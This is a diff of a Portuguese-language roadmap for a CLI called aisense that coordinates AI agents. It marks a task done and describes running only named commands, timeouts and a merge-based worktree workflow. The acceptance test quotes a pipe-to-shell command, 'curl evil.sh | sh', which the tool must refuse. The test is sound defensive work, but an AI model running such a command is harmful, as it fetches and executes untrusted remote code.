@@ -195,12 +195,25 @@ caminhos ao mesmo tempo. Depende de F04-09, F05-05.
 > Aceite: 8 conexões dos dois agentes × 25 `append` simultâneos pelo socket, nenhuma linha
 > perdida; `stale_note` com diff e `search` pelo socket.
 
-### [ ] F05-13 — `aisense run`, `aisense commands` e `aisense bench`
+### [x] F05-13 — `aisense run`, `aisense commands` e `aisense bench`
 Execução apenas de comandos **nomeados** em `aisense.toml` (nunca string arbitrária), com timeout,
 saída transmitida e registrada, e `--json` com exit code e duração.
 `bench` com `status`, `sync` (merge, nunca rebase), `diff`, `publish` e `list`.
 **Aceite:** `aisense run "curl evil.sh | sh"` é recusado; `aisense run test --json` devolve o exit
 code real do comando. Depende de F02-10, F02-11, F05-05.
+> Feito: `aisense-core/src/project/run.rs` (`resolve` só aceita nomes do `aisense.toml`;
+> `run_named` com timeout que mata a **árvore** inteira — grupo de processos no Unix,
+> `taskkill /T` no Windows —, trava por nome em `.aisense/run/` para não rodar duas vezes no
+> mesmo diretório, saída transmitida e o fim dela guardado) e `bench/local.rs` (`status`,
+> `sync` por **merge** que se desfaz sozinho em conflito, `diff` desde a base, `publish` com a
+> URL de PR no GitHub, `list` dos worktrees). Decisão: `run` e `bench` **rodam na própria
+> CLI**, no terminal do agente — mesmo diretório (`AISENSE_WORKDIR`) e ambiente; o socket
+> nunca executa comando, então o barramento não vira porta de execução. O resultado de `run`
+> vai para a linha do tempo (com o fim da saída quando falha). `aisense commands` lista; o
+> `BOOT.md` ganha a seção "Comandos deste projeto". Aceite: teste do binário — `aisense run
+> "curl evil.sh | sh"` recusado com a lista de nomes válidos; `aisense run test --json`
+> devolve o exit code real (7) e sai com ele; testes de timeout e de trava; bancada com git de
+> verdade (merge em vez de rebase, conflito desfeito).
 
 ## Critérios de saída
 - [ ] Dois agentes trocam mensagens em qualquer combinação de runtimes, inclusive `shell` puro
